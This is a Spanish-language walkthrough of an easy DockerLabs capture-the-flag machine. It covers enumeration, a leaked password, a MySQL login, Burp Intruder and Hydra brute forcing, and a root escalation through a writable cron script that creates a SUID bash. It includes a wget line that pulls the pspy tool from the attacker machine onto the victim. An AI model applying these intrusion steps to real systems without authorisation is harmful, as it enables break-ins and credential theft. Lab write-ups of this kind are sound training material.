
**IP**:  172.17.0.2
**S.O**: Linux
**Source:** DockeLabs
**Level:** Fácil
**Date:** 24 enero 2026
**Autor**:
**Descripción**: 

Web Enumeration
Fuzzing con gobuster
Information Leakage
MYSQL Enumeration
Brute Force with Sniper attack burp suite
Brute force with Hydra
Enumeración de procesos y comandos - Pspy
[[Escalada de Privilegios#**Escala de Privilegios mediante Cron Jobs]] 
- Explotación de Tareas Programadas mediante Inyección de archivos


**Flags**: 


**Begin**:

---

Comenzamos haciendo un ping:
![Pasted image 20260124125518.png](../../_assets/234ee05a9c2c265aefb7302b09056ac09964bbe158463ea67df30fb2fb949083.png)
Hay conexión 
TTL: 64 -> Linux

Escaneo de Puertos abiertos TCP
![Pasted image 20260124132437.png](../../_assets/cd6198a706910e71ad7a61377796bebe61625fdebb0adaf1a4f1b573a2ac8f49.png)
Puertos abiertos: 
Puertos 22 (SSH)
Puertos 80 (HTTP)
Puertos 3306 (MYSQL)

Escaneo de versión a los puertos específico 22,80,3306. 
![Pasted image 20260124125624.png](../../_assets/01c8b482dec5076658c57cfaa7d57f70047d36c491bb3ced1bb5ca0c848b421e.png)



Accedemos a la pagina web
![Pasted image 20260124132458.png](../../_assets/434b8eb811b33d62a08c6d3c0f54b60ba61b540e3cffc0e015adb11f132d6f21.png)

Inspeccionamos el código fuente.
![Pasted image 20260124133442.png](../../_assets/1e5e7e5af73a1e71eca233a960752e2eed9fb7cc7772003604cf566a166864ad.png)
Y vemos que nos mencionan dos nombres: `Grooti` y `Rocket`

Hacemos un fuzzing de directorios
![Pasted image 20260124133002.png](../../_assets/fa3d365355f082f0d6ae3b59d25cda02adcda6efe1700700b59fada5e2ec32e3.png)


Y nos dirigimos a `/archives`
![Pasted image 20260124132716.png](../../_assets/c7e171aeef82f4791debf77c8c2af78724b0799b4f37f14284ec44aed929a9a7.png)
No vemos nada interesante y nos dirigimos a otro directorio

Nos dirigimos a `secret` 
![Pasted image 20260124132929.png](../../_assets/9e50a63570d69dfed681a47d6330b2fa8dc0747dd815a8d2bb8db3b676dd0a3b.png)
Donde nos dan la opcion de descargar y al descargar, nos dan un archivo .txt que dice: `look carefully here ;)`

Al dirigirnos al directorio `imagenes` vemos dos archivos.
![Pasted image 20260124133031.png](../../_assets/5ea574ad8869c7e42f26a4406c0851293a412c75130145ad839308ce4d450ef0.png)

Leemos en `README.txt`
![Pasted image 20260124133041.png](../../_assets/c1e860dd887c78bbfdc05988f9d88c7b2aa9c133b4101d62ff85126331bfff9e.png)
Y nos dan una contraseña

Lo probamos en el servicio `mysql` con el usuario `rocket`
```bash
mysql --skip-ssl -h 172.17.0.2 -P 3306 -u rocket -p
```
Y logramos acceder a la base de datos

Indicamos que queremos ver las bases de datos.
![Pasted image 20260124135329.png](../../_assets/579d9bc8dc7b8fe497a7ab54238d99be4c3a5428395023c7818f5676cd3e5f77.png)
Nos vamos a `files_secret`

Luego indicamos que nos muestre las tablas
![Pasted image 20260124135340.png](../../_assets/88bd45d5be149f92442fb794b854867d4843cd574ebb9b86490ef2a9a10cc657.png)

Luego visualizamos `rutas`
![Pasted image 20260124135351.png](../../_assets/aa4f88f64c0ed00c3cd4461f13408caa71cbe0fde7e76f7c199dfa19ae56f11d.png)

De las rutas vistas, nos dirigimos a `unprivate/secret`
![Pasted image 20260124135415.png](../../_assets/b7d6b19284516f613fd1318df729a47325e1c3f0a7a1a1d1262788f7809ae9be.png)
Y vemos un formulario, donde nos piden ingresar en mensaje de texto y un numero

Al ingresar los datos , se nos descarga un archivo .txt
![Pasted image 20260124135528.png](../../_assets/0efb031724e50fca5265fe08e17f3a0cf428d239e35c6d616c8d6fc90ddcd71b.png)
Donde al leer el archivo, nos dice: buen intento
Eso significa que hay una variación en donde es la acertada
Para no intentar uno por uno vamos a Iterar varias peticiones con `Sniper attack` de  `burp suite`

Para ello entonces primero interceptamos la petición con `burp suite`
![Pasted image 20260124140517.png](../../_assets/c2585028dde1182bdec111a6f651d897261d03e5ba125af108a1630454aa0fa9.png)
Lo llevamos al intruder

Y usamos el `Sniper attack`, es un  ataque que prueba varias posiciones en una solicitud HTTP
![Pasted image 20260124141258.png](../../_assets/b4fb166b16ef4b2aaf02312acc9fa395ab056b7b60b5410b84f5bc7763425ba9.png)
Ajustamos las opciones, que pruebe con numero del 1 al 100

Y de todos los intentos que realizo hay uno diferente con mayor `legth` el cual es el correcto
![Pasted image 20260124141438.png](../../_assets/fceb66f1d32b44c15881da2e31be40c59f6e7b426d465f9fbd103f8925d9b5b3.png)

Ingresamos el numero en la pagina web, y se nos descarga un archivo: `password16.zip`
![Pasted image 20260124142401.png](../../_assets/323fb283c3e93dffa99f85e879d64c2b5c1f93f4d6a814344b939520fff53b03.png)

Lo descomprimimos, nos piden una contraseña y ingresamos la que habiamos encontrado anteriormente que era `password1`
![Pasted image 20260124141921.png](../../_assets/9761cb75e4cd212322c27ab654faa2e8436ed39910851ba783831e4dd3c904c4.png)

Con la contraseña encontrada procedemos a realizar una fuerza bruta
En un archivo .txt colocamos todos los nombres encontrados al enumerar la pagina web
```bash
nano users.txt
```
![Pasted image 20260124142502.png](../../_assets/22b1fc2a5573f71577a443b45dfbf1ad393e7943f162b399650b3e03aa6d7d86.png)

Y procedemos a realizar la fuerza bruta con `hydra`
![Pasted image 20260124142647.png](../../_assets/d7056040a6fc5553a092262585b724c626932062b8dd4e354224250f4d6086a9.png)
Y logramos encontrar las cerdenciales

Accedemos al servicio SSH
![Pasted image 20260124142716.png](../../_assets/f3394af3d28f3e53d338ccf7cfa5b9805d18c976748952331ec898ca77125a9b.png)

Para realizar la escalada de privilegios hicimos el uso de la herramienta `pspy` para ver los procesos que se están ejecutando en la maquina victima.

Levantamos un servicio web en el puerto 80 en nuestra maquina kali
```bash
python3 -m http.server 80
```

Y desde nuestra maquina victima lo descargamos 
```bash
wget http://172.17.0.1/pspy64
```

Le damos permisos de ejecucion y lo ejecutamos
![Pasted image 20260124144133.png](../../_assets/d034c20b5fae94431a425ca5957ea815f60196bd05bfab73df6fd96ba7700c30.png)
Vemos que **root** esta ejecutando un script del directorio `/tmp`

Listamos los archivos del directorio 
![Pasted image 20260124142737.png](../../_assets/602edd2d4b57d58b6d988c1079c11042eda3e224115cc1de63b4f79a2308bc64.png)
Y vemos que si existe el script y tenemos permiso de escritura

Modificamos el script y hacemos ejecute `rootbash` que es aquel que nos dará una shell y tambien le diremos tenga permisos suid
![Pasted image 20260124144250.png](../../_assets/6009df4ed22a20f914e428c79e63f0bd74a2774700c0aeb3bec67f3bf985ecd4.png)

El `malicious.sh` se ejecutara y tendremos a `rootbash` con los permisos suid que la ejecutarlo nos dara una shell con los privilegios de **root** 
![Pasted image 20260124144336.png](../../_assets/c0ea73b043587934d0271fe4e5ce4693f177c81929e50b81e83283de6d76fe28.png)
Escalada exitosa a root
